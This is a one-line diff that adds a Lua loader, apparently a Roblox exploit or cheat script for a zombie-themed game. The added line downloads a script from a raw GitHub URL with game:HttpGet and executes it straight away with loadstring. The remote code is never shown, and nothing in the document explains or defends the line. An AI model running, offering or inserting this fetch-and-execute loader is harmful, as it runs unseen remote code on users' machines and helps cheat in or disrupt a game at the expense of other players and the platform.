@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Centeryeabyss/loaders/main/loaders/new-zombie-air-force-spam4-unrg1gh3jqwxg2.lua"))()
